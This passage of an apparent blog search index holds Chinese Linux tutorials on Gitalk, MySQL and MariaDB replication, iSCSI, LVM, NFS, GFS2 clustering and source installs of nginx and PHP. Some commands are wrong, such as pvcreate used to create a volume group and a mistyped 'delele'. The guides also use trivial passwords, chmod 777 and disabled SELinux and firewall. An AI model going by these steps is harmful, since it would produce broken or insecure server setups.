除了建仓库，还需要注册一个应用。[官方注册地址](https://github.com/settings/applications/new)。\n\n* Application name填写的还是一个应用程序的名字，这里我填写的和仓库的名字保持一样了，你们按照喜好来就OK。\n* Homepage URL然后填写的是你的网站域名。\n* Application description接下来又是一个描述类的信息，选填。\n* Authorization callback URL这里同样填写你网站的域名。\n* 最后注册应用程序等待完成就好。\n\n![创建应用程序](./gitalk-comment/2.png)\n\n3. 创建完成后，默认会进入应用程序，接下来要完成一个秘钥的生成。\n\n* Client ID默认会存在。这个待会还会用到。\n* 默认是不存在密钥的，要点击生成秘钥，生成之后要立刻复制下来，因为保存或者离开页面就变成图例这样了。这个待会还会用到。\n* logo可以自己设计一个，感觉蛮不错的。\n* 都设置完之后点击最下面的Update Application。\n\n![设置应用程序](./gitalk-comment/3.png)\n\n后期如果需要对应用程序进行一些修改，可以依次到github头像-->setting-->Developer Settings-->OAuth Apps进行修改。\n\n### 修改配置文件\n\n修改配置文件的部分，进入博客主目录，`vim themes/next/_config.yml`\n\n1. 首先需要把`active`的值，改为gitalk\n\n```yaml\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: gitalk\n  # Setting `true` means remembering the comment system selected by the visitor.\n  storage: true\n  # Lazyload all comment systems.\n  lazyload: false\n  # Modify texts or order for any naves, here are some examples.\n  nav:\n    #disqus:\n    #  text: Load Disqus\n    #  order: -1\n    #gitalk:\n    #  order: -2\n```\n\n2. 然后往下滑，找到gitalk的模块。\n\n  * enable的值设置为true，表示启用。\n  * github_id表示你的github的账号。\n  * repo，填写用来存储评论的仓库。\n  * client_id之前创建的ID。\n  * client_secret之前创建好的口令。\n  * admin_user这个是管理员的账户，也就是你自己的github账号。\n  * distraction_free_mode默认就好。\n  * proxy代理值，默认就好。\n  * language语言类型，别的地方我不管，在我这里必须讲中文。\n\n```yaml\ngitalk:\n  enable: true\n  github_id: lxp731 # GitHub repo owner\n  repo: hexo-comment # Repository name to store issues\n  client_id: b771bc******0002c29 # GitHub Application Client ID\n  client_secret: e87e6******531007231*******5ab3c131d3aa1 # GitHub Application Client Secret\n  admin_user: lxp731 # GitHub repo owner and collaborators, only these guys can initialize gitHub issues\n  distraction_free_mode: true # Facebook-like distraction free mode\n  # When the official proxy is not available, you can change it to your own proxy address\n  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token # This is official proxy address\n  # Gitalk's display language depends on user's browser or system environment\n  # If you want everyone visiting your site to see a uniform language, you can set a force language value\n  # Available values: en | es-ES | fr | ru | zh-CN | zh-TW\n  language: zh-CN\n  ```","tags":["博客评论"],"categories":["博客搭建"]},{"title":"二进制日志与数据库复制的关系","url":"/2023/07/13/why-mysql-binlog/","content":"\n### 数据库复制的原理解读\n\n最近进行的大三的小学期答辩属实是让我重新审视了自己，有些操作自己是会配置了，也可以达到自己的需求了，但是对于技术的底层逻辑和原理并不清楚，为了避免自己成为一个机械的打字员，有必要将一些技术的底层实现原理进行一些剖析。\n\n这是网上找的数据库主从复制的原理图。接下来结合这张图来进行对数据库主从复制的原理讲解。\n\n<!-- more -->\n\n![数据库主从复制的](./why-mysql-binlog/1.png)\n\n1. master首先记录二进制日志，将master主机上所有发生的操作（增删改）都记录到二进制日志中去。\n\n2. slave会开启一个I/O进程，用来和master建立连接，进行binlog dump process。这个进程会从二进制日志中读取事件，如果二者是同步的，那么slave会进入休眠状态，等master产生新的事件，slave会通过I/O连接将新事件写进自己的中继日志里去。\n\n3. SQL thread是复制的最后一步。SQL线程会从slave的中继日志中读取事件，并在本机中进行重放，直至与master的数据保持一致。\n\n4. 通过课外资料的查询，还发现一个很有意思的点：复制过程有一个很重要的限制-->复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。\n\n### 额外的话\n\n在平常项目中，老师验证你的数据库主从复制或者双主的依据就是观察数据库`show slave status \\G`的`Slave_IO_Running`和`Slave_SQL_Running`两个“yes”。通过这个文章结合这张图片，突然就可以顿悟为什么这两个参数变为“yes”就代表数据库的复制功能是实现的了。","tags":["MySQL","Linux"],"categories":["理论知识"]},{"title":"Linux多网卡引起的网络不可达","url":"/2023/07/13/modify-METRIC/","content":"\n### 现象描述\n\n这是我最经做项目遇到的一个怪现象，是这样的，我在虚拟机里装了两块网卡，第一块呢，我用来进行虚拟机之间业务的通信，所以就选择了“仅主机模式”，第二块网卡是用来连接网络yum源的，所以就是“NAT模式”。\n\n在我第二天继续做项目的时候，我发现我的虚拟机集体罢工，都不能正常的访问外网了，尝试`ping 8.8.8.8`也不可达。我查看第二块网卡的IP，查看与宿主机之间的连接，网段，网管都是没有问题的。我百思不得其解，我之后进行Google才了解到，这是和网卡的METRIC值有关系的。\n\n<!-- more -->\n\n### 问题分析\n\n“METRIC”是Linux网卡的一个参数，本意是“度量值”的意思，这个数值越大，代表这块网卡的优先级越低。而在CentOS Linux 系统中默认的“METRIC”值是按照添加的顺序进行编号的。我第一块是“仅主机模式”的网卡，默认的“METRIC”值是100，第二块后添加的“NAT模式”网卡“METRIC”是101。\n\n查看METRIC值可以用这两条命令，我个人更倾向第二条，因为显示效果很整齐：\n\n```bash\nip route\n```\n\n```bash\nroute -n\n```\n\n那么问题就找到了，当我去`ping 8.8.8.8`的时候，默认是从“METRIC”值小的网卡出去的流量，也就是仅主机的网卡，那么自然也就访问不到外网了。\n\n### 解决办法\n\n解决办法也比较简单，在一切皆文件的Linux系统中，修改的参数无非就是对配置文件的修改。在本例中我们修改网卡的配置文件`/etc/sysconfig/network-scripts/ifcfg-ens224`。只需要在里面加上一行`IPV4_ROUTE_METRIC=10`，加在哪一行无所谓，只要单词不要拼错；改成多少都无所谓，只要比另一张网卡的“METRIC”值小就OK。\n\n然后我们重启网络服务，再重新up网卡，然后再查看网卡的“METRIC”值，验证是否生效，如果一切顺利，那么现在再去`ping 8.8.8.8`应该会发现已经好使了。","tags":["Linux"],"categories":["技术"]},{"title":"Linux关于iscsi+pacemaker+CLVM+gfs的实现","url":"/2023/07/05/gfs/","content":"\n### 基本信息\n\n|||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|\n|主机名|身份|网络接口|连接模式|IP地址|\n|web3|web服务器|ens224|仅主机|10.8.7.82/24|\n|web4|web服务器|ens224|仅主机|10.8.7.83/24|\n|storage1|iscsi存储服务器|ens224|仅主机|10.8.7.41/24|\n|storage2|iscsi存储服务器|ens224|仅主机|10.8.7.42/24|\n\n### 项目说明\n\n在本项目中，主要完成以下任务：\n\n1. 完成gfs1和gfs2关于ISCSI存储服务器的搭建，并且成功挂载到web1和web2主机。\n\n<!-- more -->\n\n2. 建立web1和web2主机的集群关系。\n\n3. 挂载GFS文件系统。\n\n4. 配置集群资源。\n\n5. 创建CLVM。\n\n6. 挂载共享存储。\n\n### 准备环境\n\n* Centos7版本的虚拟机，Centos8版本的没有找到资料，还在自我探索的过程中。等待后期的更新吧。\n\n* 虚拟机关闭SELINUX。\n\n* 虚拟机关闭防火墙。\n\n* 虚拟机关闭NetworkManager。\n\n* 编写`/etc/hosts`文件，这个可选，我是为了后期配置方便，才写这样一个文件。\n\n```bash\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n10.8.7.82   web3.liuxp.com\n10.8.7.83   web4.liuxp.com\n10.8.7.41   storage1.liuxp.com\n10.8.7.42   storage2.liuxp.com\n```\n\n如果你也打算用这个，编辑完之后可以使用scp命令直接拷贝到别的主机。\n\n```bash\nscp /etc/hosts 10.8.7.42:/etc/\n```\n\n### 项目实施\n\n* 一定要按照顺序来做。\n\n* 关于ISCSI服务器创建和挂载到客户端的操作，具体搭建过程可以看[搭建并挂载ISCSI存储服务器](https://nustarain.gitee.io/2023/07/04/ISCSI/)这篇文章，本文章不在赘述。对于我这个项目，两台ISCSI存储器都各自提供了一块磁盘，并且在两台web服务器都实现了挂载，storage1提供的ISCSI存储映射到web服务器上是`/dev/sdb`，storage2提供的ISCSI存储映射到web服务器上是`/dev/sdc`。\n\n* 我接下来讲的“两台虚拟机”是指web3和web4，“任意一台虚拟机”是指web3或者web4其中的任意一台。\n\n* 下载软件，两台虚拟机都需要做的\n\n```bash\nyum -y install pacemaker pcs\nsystemctl start pcsd\nsystemctl enable pcsd\necho \"q\" | passwd --stdin hacluster\n```\n\n这块的意思是下载了pcsd服务，开启并设置自启动，安装这个服务会再系统创建一个`hacluster`用户，后面要用，要先给他改个密码。\n\n* 集群建立免认证，在集群任意一台机器做就可以\n\n说白一点，就是web3生成公钥私钥，然后把公钥发给web4，或者web4生成公钥私钥，然后把公钥发给web3。\n\n```bash\nssh-keygen\nssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com\n```\n\n上面的命令是以web3举的例子。\n\n* 搭建集群，两台虚拟机都需要做的\n\n```bash\npcs cluster auth web3.liuxp.com web4.liuxp.com\nUsername: hacluster\nPassword:q\nnode3: Authorized\nnode4: Authorized\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force # 如果报错就强制执行进行覆盖\npcs cluster start\npcs cluster status\npcs cluster enable --all\npcs status corosync\n```\n\n一般情况下如果第一次创建集群，上面命令可以直接创建成功，如果不是第一次创建，就需要加`--force`选项强制覆盖。等到所有信息都success，下面的集群开启，查看状态，设置自启动都不会出现什么问题的。\n\n如果第一次集群出现了什么问题，打算重新做，可以通过下面的这个命令摧毁集群，然后再强制建立集群。\n\n```bash\npcs cluster destroy\n```\n\n* 挂载GFS文件系统，两台虚拟机都需要做的\n\n```bash\nyum install -y lvm2-cluster gfs2-utils fence-agents-all\nlvmconf --enable-cluster\nmodprobe gfs2\nlsmod | grep gfs2 \n```\n\n在进行完最后一步之后，如果出现一些看不懂的内容就说明，GFS文件系统已经挂载到这个系统上了，可以使用它进行格式化磁盘了。\n\n* 配置集群资源，在集群任意一台机器做就可以\n\n```bash\npcs property set no-quorum-policy=ignore\npcs property set stonith-enabled=false\n\npcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=true op monitor interval=30s clone interleave=true ordered=true\n\npcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s clone interleave=true ordered=true\n\npcs constraint order start dlm-clone then clvmd-clone\npcs constraint colocation add clvmd-clone with dlm-clone\npcs property set no-quorum-policy=freeze\n```\n\n这块是没有个性化的，可以直接无脑<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>\n\n* 创建CLVM，在集群任意一台机器做就可以\n\n```bash\npvcreate /dev/sdb\npvcreate /dev/sdc\nvgcreate -cy qavg /dev/sdb /dev/sdc\nlvcreate -L 12G -n qa qavg\n```\n\n这里命令的具体含义如果不懂，可以看我的[关于LVM的配置](https://nustarain.gitee.io/2023/07/04/LVM/)的文章。\n\n* 挂载实现共享存储\n\n```bash\n# 格式化文件系统，在集群任意一台机器做就可以\nmkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa\n# 创建挂载点，两台虚拟机都需要做的\nmkdir /mnt/cluster\n# 要实现自动挂载，在集群任意一台机器做就可以\npcs resource create fs_gfs2 Filesystem device=\"/dev/qavg/qa\" directory=\"/mnt/cluster\" fstype=\"gfs2\" options=\"noatime,nodiratime\" op monitor interval=10s clone interleave=true\n\n# 给集群资源设置启动顺序\npcs constraint order start clvmd-clone then fs_gfs2-clone\npcs constraint colocation add fs_gfs2-clone with clvmd-clone\npcs constraint show\ndf\n```\n\n最后`df`如果看到自己创建的逻辑卷`/dev/qavg/qa`，就说明挂载成功了，可以通过向挂载点里面写入文件来使用存储了。","tags":["Linux"],"categories":["技术"]},{"title":"关于LVM的配置","url":"/2023/07/04/LVM/","content":"\n### 概述\n\nLVM里面主要有三个名词，物理卷（PV），卷组（VG），逻辑卷（LV）。\n\n物理卷可以有很多形式，一块单独的磁盘（`/dev/sda`），一个分好的分区（`/dev/sdb2`），甚至一个文件都可以是物理卷的一种形式。\n\n单个物理卷或者多个物理卷都可以组合起来变成一个卷组，这样就把几个单独的存储空间给整合了起来，变成了一个大的存储池。\n\n如果要使用的话，我们可以从这个池子里面分出一部分来作为存储，这个存储就是逻辑卷。\n\n### 物理卷\n\n* 创建物理卷\n\n```bash\npvcreate /dev/sdb\n```\n\n<!-- more -->\n\n* 查看物理卷的详细信息\n\n```bash\npvdisplay\n```\n\n* 查看物理卷的精简信息\n\n```bash\npvs\n```\n\n### 卷组\n\n* 创建卷组\n\n```bash\npvcreate qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组。\n\n```bash\npvcreate -s 16M qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组，并且设置卷组里最小的逻辑存储单位为16M。\n\n* 查看卷组的详细信息\n\n```bash\nvgdisplay\n```\n\n* 查看卷组的精简信息\n\n```bash\nvgs\n```\n\n* 扩容卷组\n\n```bash\nvgextend qavg /dev/sdb2\n```\n\n将物理卷`dev/sdb2`加入卷组qavg\n\n* 删减卷组\n\n```bash\nvgreduce qavg /dev/sdb2\n```\n\n将物理卷`/dev/sdb2`从卷组qavg中删除\n\n* 删除卷组\n\n```bash\nvgremove qavg\n```\n\n* 重命名卷组\n\n```bash\nvgrename /dev/qavg1 /dev/qavg2\n```\n\n重命名卷组`/dev/qavg1`为`/dev/qavg2`。\n\n### 逻辑卷\n\n* 创建逻辑卷\n\n```bash\nlvcreate -L 200M qavg -n qa\n```\n\n利用`qavg`这个卷组创建一个叫`qa`大小为200M的逻辑卷。这里的**L选项**指定的是平常讲的磁盘的大小。\n\n```bash\nlvcreate -l 45 qavg -n qa\n```\n\n使用**l选项**是指定的逻辑的块多少，比如上面创建卷组时指定的一个块的大小是16M，这里指定45个，逻辑卷的大小就是720M\n\n* 扩容逻辑卷\n\n```bash\nlvextend -L +54 /dev/qavg/qa\n```\n\n这个是指在原来逻辑卷的基础上再增加54Mib的存储空间。但增加不能超过卷组的总容量大小。\n\n```bash\nlvextend qavg/qa /dev/sdk3\n```\n\n使用卷组里`/dev/sdk3`这个物理卷的全部空间为`qavg/qa`扩容。\n\n```bash\nlvextend -L+16m qavg/qa /dev/sda:8-9 /dev/sdb:8-9\n```\n\n使用卷组里`/dev/sda`的8-9M的空间和`/dev/sdb`的8-9M的空间为逻辑卷`qavg/qa`扩容\n\n```bash\nlvextend -l+100%FREE -r qavg/qa\n```\n\n使用卷组所有剩余的空间为`qavg/qa`扩容。\n\n* 查看逻辑卷详细信息\n\n```bash\nlvdisplay\n```\n\n* 查看逻辑卷精简信息\n\n```bash\nlvs\n```\n\n* 删除逻辑卷\n\n```bash\nlvremove qa\n```\n\n这块的命令虽然看着挺多，但是3大类都是一个逻辑。创建，查看，删除这都是一样的，无非就是扩容的命令得记一下。加油少年！","tags":["Linux"],"categories":["理论知识"]},{"title":"搭建并挂载ISCSI存储服务器","url":"/2023/07/04/ISCSI/","content":"\n### ISCSI服务器端\n\n比如现在ISCSI服务器端有两块硬盘，我们想把第二块硬盘（sdb）共享出去。\n\n1. 下载软件\n\n```bash\nyum install -y targetcli\n```\n\n2. 开始进行服务端的配置\n\n* 首先键入`targetcli`进入iscsi配置模式\n\n```bash\ntargetcli\n```\n\n<!-- more -->\n\n* 然后先创建一个后端存储\n\n```bash\ncd /backstores/block/\ncreate disk1 /dev/sdb\n```\n\n`disk1`代表起的一个名字，`/dev/sdb`是真实机器里存在的设备。\n\n* 创建可以识别的iqn设备\n\n```bash\ncd /iscsi/\ncreate iqn.2023-07.com.liuxp:san1\n```\n\n`iqn.2023-07.com.liuxp:san1`是可以被客户端的识别到的名字，客户端可以凭这个名字挂载到自身。\n\n* 创建iqn里的卷，刚刚创建的iqn只是一个名字，里面现在还没有存储设备，现在要在里面添加存储设备\n\n```bash\ncd iqn.2023-07.com.liuxp:san1/tpg1/luns/\ncreate /backstores/block/disk1\n```\n\n* 创建好iqn里的存储设备，然后就该设置iqn设备的访问权限了\n\n```bash\ncd ../acls/\ncreate iqn.2023-07.com.liuxp:web1\n```\n\n不要奇怪这个新创建的iqn是一个识别秘钥，客户端需要拿着这个秘钥来连接，以此来达到访问控制的目的。具体的操作是将这个`acls`里的`iqn`名字复制下来待会粘贴到客户端的一个配置文件里面。\n\n* 设置门户，这个我也解释不清楚含义，就是想在这里介绍一下删除命令，还有如果要设置的话，要设置为本机的IP\n\n```bash\ncd ../portals/\ndelele 0.0.0.0 3260\ncreate 10.8.7.41 3260\n```\n\n* 到这里就设置完成了键入`exit`退出设置。\n\n* 启动服务\n\n```bash\nsystemctl start target.service \n```\n\n### ISCSI客户端\n\n1. 下载软件\n\n```bash\nyum install -y iscsi-initiator-utils\n```\n\n2. 修改配置文件`/etc/iscsi/initiatorname.iscsi`\n\n```bash\nInitiatorName=iqn.2023-07.com.liuxp:web1\n```\n\n把这里的iqn设置为服务器端`acls`里的那个iqn，上面也说过一嘴。\n\n3. 然后开始扫描iqn设备\n\n```bash\niscsiadm -m discovery -t st -p 10.8.7.41\n```\n\n**p选项**后面接上服务器端的IP地址。\n\n4. 扫描到之后接着开始最后一步挂载\n\n```bash\niscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l\n```\n\n**T选项**后面接上面刚刚扫描出来的iqn设备，**p选项**接ISCSI服务器的IP\n\n5. 可以通过下面的命令查看挂载成功的会话信息\n\n```bash\niscsiadm -m session\n```\n\n6. 如果需要的话可以了解一下，卸载本地已挂载的全部ISCSI存储设备\n\n```bash\niscsiadm -m node --logoutall=all\n```\n\n7. 写在最后的话\n\n如果遇到第4步无法挂载，一是要检查配置文件的iqn是否和服务器acls设置一致，二是要检查IP地址时候填写正确，客户端如果检查都无误了，因为之前会产生缓存，一般后面几次也不会成功，可以通过删除`/var/lib/iscsi/nodes`及`/var/lib/iscsi/send_targets`下的内容之后再次尝试。如果还是不行，就只能重启了。如果对服务器端进行了修改，一定要记得重启服务生效。","tags":["Linux"],"categories":["技术"]},{"title":"NFS挂载到服务器","url":"/2023/07/04/nfs/","content":"\n||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|NFS|存储服务器|ens224|仅主机|10.8.7.40/24|nfs-utils|\n|Web1|Web服务器|ens224|仅主机|10.8.7.80/24|nginx、nfs-utils|\n\n### NFS服务器部分\n\n1. 下载软件\n\n```bash\nyum install -y nfs-utils\n```\n\n<!-- more -->\n\n2. 编辑配置文件`vim /etc/exports`\n\n```bash\n/www 10.8.7.80(rw)\n```\n\n这个配置文件代表将自己主机下的`/www`目录共享给10.8.7.80主机，并且赋予读和写的权限。\n\n3. 要记得把要共享出去的目录赋予相应的权限，要不然访问起来会有问题,在这里我直接给了`777`，不要学我，只是告诉你们如果后期NGINX访问出现404，应该要想到回到这里思考权限的问题。\n\n```bash\nchmod 777 /www\n```\n\n4. 启动服务\n\n```bash\nsystemctl start nfs-server\n```\n\n5. 导出配置文件\n\n```bash\nexportfs -rv\n```\n\n### Web服务器的部分\n\n1. 创建挂载点\n\n```bash\nmkdir /www\n```\n\n2. 编辑`/etc/fstab`实现永久挂载\n\n```bash\n10.8.7.40:/www  /www    nfs     rw,sync 0 0\n```\n\n3. 挂载共享目录\n\n```bash\nsystemctl daemon-reload\nmount -a\n```","tags":["Linux"],"categories":["技术"]},{"title":"NGINX整合PHP","url":"/2023/07/04/nginx-union-php/","content":"\n### NGINX整合PHP\n\n这个实现起来比较简单，就是一段代码的事，但是之前没有出现我这样的开源工作者的时候，我只能手敲那一段代码，有时候一不留神就会把单词拼错，尤其是朱行查找错误的时候，简直苦不堪言。为了后浪们的幸福生活，再次我将那一段代码写下来供你们<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>使用。\n\n<!-- more -->\n\n具体操作如下：\n\n* 打开NGINX的配置文件,添加这一段。\n\n```bash\n        location ~ \\.php$ {\n            root   /web;\n            fastcgi_pass    127.0.0.1:9000;\n            fastcgi_index   index.php;\n            fastcgi_param   SCRIPT_FILENAME $document_root$fastcgi_script_name;\n            include         fastcgi_params;\n        }\n```\n\n补一张图片显示要插入的位置。\n\n![](./nginx-union-php/1.png)\n\n然后就完成了NGINX和PHP的联动。","tags":["Linux"]},{"title":"源码安装PHP","url":"/2023/07/04/php/","content":"\n### 安装PHP\n\n无论是在Centos7还是在Centos8都需要进行源码安装，其实这句话也不对，因为在Centos8里是可以yum安装php和php-fpm的。但是，安装之后使用`php-fpm start`启动命令之后是监听不到内容的。有可能是自己还是不太会用Centos8的PHP，自己也没有再去深入研究，做的项目都是用的源码装的，在这里先把源码安装的教程发不出来，后续有时间再去研究。\n\n<!-- more -->\n\n[PHP源码包下载链接](https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u)\n\n提取码：ba1u\n\n* 解压源码包\n\n```bash\ntar -zxf php-5.6.17.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\nyum install -y libxml2 libxml2-devel\n```\n\n这里分了两条依赖命令，如果是按照之前我写的[源码安装NGINX的博客](https://nustarain.gitee.io/2023/07/04/nginx/)已经安装NGINX了，那么不需要再执行第一条yum命令，反之则相反，如果你也不确定，那就全部执行一遍吧。\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli\n```\n\n* 再执行两步安装完成\n\n```bash\nmake  # 这里make的时间会相对长一点\nmake install\n```\n\n* 拷贝一份配置文件\n\n```bash\ncp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf\n```\n\n* 拷贝启动文件\n\n```bash\ncp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm\n```\n\n* 为启动文件添加启动权限\n\n```bash\nchmod +x /etc/init.d/php-fpm\n```\n\n* 再拷贝一份到系统的命令里面\n\n```bash\ncp /etc/init.d/php-fpm /sbin/php-fpm\n```\n\n然后就可以使用简单的命令对PHP进行管理\n\n```bash\nphp-fpm start\nphp-fpm reload\nphp-fpm stop\n```\n* 启动之后可以检查一下监听端口\n\n```bash\nlsof -i:9000\n```","tags":["Linux"],"categories":["技术"]},{"title":"源码安装NGINX","url":"/2023/07/04/nginx/","content":"\n### 安装NGINX\n\n如果是centos8版本的话，可以直接使用本地yum或者网络yum安装NGINX，对于8版本的就不在做过多赘述。\n\n主要针对Centos7版本做一下说明，因为Centos7的yum是不提供NGINX的，所以需要自己手动使用源码安装的方式进行安装。\n\n<!-- more -->\n\n[nginx源码包下载链接](https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1)\n\n提取码：46k1\n\n* 解压源码包\n\n```bash\ntar -zxf nginx-1.17.10.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\n```\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/nginx --with-http_ssl_module\n```\n\n* 再执行两步安装完成\n\n```bash\nmake\nmake install\n```\n\n此时NGINX的启动命令是在`/usr/local/nginx/sbin/nginx`里。\n\n直接执行这条命令可以启动NGINX\n\n```bash\n/usr/local/nginx/sbin/nginx\n```\n\n但是这个命令是在太长了，很不方便，我们可以拷贝一份到系统命令里面。\n\n```bash\ncp /usr/local/nginx/sbin/nginx /sbin/nginx\n```\n\n然后我们就可以愉快地使用一些简单的命令来对NGINX进行管理。\n\n```bash\nnginx # 启动nginx\nnginx -s reload # 重启nginx\nnginx -s stop # 关闭nginx\n```\n\n启动之后，可以通过80端口检查是否处于监听状态\n\n```bash\nlsof -i:80\n```\n\n再补充一点，就是关于NGINX的配置文件，源码安装的NGINX配置文件的路径`cd /usr/local/nginx/conf`里面很多我们不需要的内容，直接一条命令带走他们。\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n之后就很清爽了，开始配置吧少年。","tags":["Linux"],"categories":["技术"]},{"title":"Mariadb双主复制+Keepalived","url":"/2023/06/04/keepalived-linux/","content":"\n在最后的Linux高级课程的最后，完成了高可用负载均衡WEB服务器的搭建，比较贴合实际的生产环境，一共使用到了7台虚拟机，在我这个阶段，已经是我取得的最高成就了。感觉有必要记录下来，既是帮助后来者，也是方便自己日后进行复习总结。\n\n### 项目梗概\n\n项目一共设计7台虚拟机，其中2台作为调度机，进行对访问请求的分配；2台作为Nginx服务器；2台作为Mariadb数据库服务器；一台作为NFS储存服务器，负责存储Nginx服务器的网页资源。其逻辑拓扑图如下：\n\n<!-- more -->\n\n![拓扑图](./keepalived-linux/1.png)\n\n我会分几个部分来介绍这个项目的配置，本次先来介绍mariadb实现双主复制和keepalived。\n\n其中服务器的IP规划如下：\n\n|  主机名   |  角色  | 网卡名 |  模式  |       IP        |       VIP       |      网关       |\n| :-------: | :----: | :----: | :----: | :-------------: | :-------------: | :-------------: |\n| mariadb-1 | mst/slv  | ens224 | 仅主机 | 172.21.8.33/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n| mariadb-2 | mst/slv  | ens224 | 仅主机 | 172.21.8.34/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n\n\n### 数据库服务器的配置\n\n数据库服务器在本项目中采用双主复制的方式，来进行高可用的实现。\n\n#### 主从复制配置\n\n|  主机名   |    身份    | 网络接口 | 连接模式 |       IP       |\n| :-------: | :--------: | :------: | :------: | :------------: |\n| mariadb-1 |  主服务器  |  ens224  |  仅主机  | 172.21.8.33/24 |\n| mariadb-2 | 备份服务器 |  ens224  |  仅主机  | 172.21.8.34/24 |\n\n\n\n1. 首先在mariadb-1中进行软件的安装。\n\n```bash\nyum install -y mariadb-server\n```\n\n2. 修改配置文件。\n\n主配置文件`/etc/my.cnf`无需修改，修改`/etc/my.cnf.d/mariadb-server.cnf`文件，在[mysqld]段下面添加配置选项，开启二进制日志功能并设置server-id。\n\n```bash\nlog-bin = master.log\nserver-id = 11\n```\n\n3. 启动mariadb-1的mariadb服务\n\n```\nsystemctl start mariadb\n```\n\n4. 进入MySQL，作为主服务器创建授权账户slave，并查看主服务器装态。\n\n```bash\nmysql -u root\n```\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.34' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-1 master status](./keepalived-linux/3.png)\n\n`show master status;`之后，表格中的File字段和Position字段要留意，待会要用到。\n\n5. 在mariadb-2上安装软件，开启二进制日志功能，并启动服务。\n\n```bash\nlog-bin = slave.log\nserver-id = 12\n```\n\n6. 进入MySQL，开启复制功能。\n\n```bash\nmysql -u root\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000002',master_log_pos = 712;\n```\n\nmaster_log_file字段填写mariadb-1`show master status`后的File内容，master_log_pos填写mariadb-1`show master status`后的Position内容。\n\n7. 在mariadb-2上查看slave状态。\n\n```\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-2 复制成功](./keepalived-linux/4.png)\n\n看到图中的两个yes，代表一边的复制功能就配置完成了。\n\n8. 然后在mariadb-2 服务器上也创建一个授权账户。\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.33' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-2 master status](./keepalived-linux/5.png)\n\n再次回到mariadb-1上，连接mariadb-2，实现复制功能。\n\n```\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000003',master_log_pos = 338;\n```\n\n9. 配置完成后，开启slave功能，查看slave状态。\n\n```bash\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-1 复制成功](./keepalived-linux/6.png)\n\n到这里数据库的主从复制已经完成了，接下来要配置数据库的keepalived功能。\n\n#### keepalived配置\n\n1. 主机 DB-master 和 DB-slave 上安装 Keepalived\n\n```bash\nyum install -y keepalived\n```\n\n2. 把配置文件保留一个副本\n\n```\ncp /etc/keepalived/keepalived.conf{,.bak}\n```\n\n3. 修改两个主机上的配置文件/etc/keepalived/keepalived.conf\n\n|  主机名   | route_id  | vrrp_instance | state  | interface | virtual_router_id | priority | virtual_ipaddress |\n| :-------: | :-------: | :-----------: | :----: | :-------: | :---------------: | :------: | :---------------: |\n| mariadb-1 | db_master |  mariadb-ha   | BACKUP |  ens224   |        60         |   100    |  172.21.8.33/24   |\n| mariadb-2 | db_slave  |  mariadb-ha   | BACKUP |  ens224   |        60         |    90    |  172.21.8.34/24   |\n\n* mariadb-1 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置模块\n\n```bash\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\t# 管理员邮箱\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_master\t# 标识\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段  \n\n```bash\nvrrp_instance mariadb-ha {\n    state BACKUP\t# 备用\n    interface ens224\n    nopreempt\t\t# 设置不抢占\n    virtual_router_id 60\n    priority 100\t# 优先级\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\t# 配合vrrp_script段使用\n        check_mariadb\n    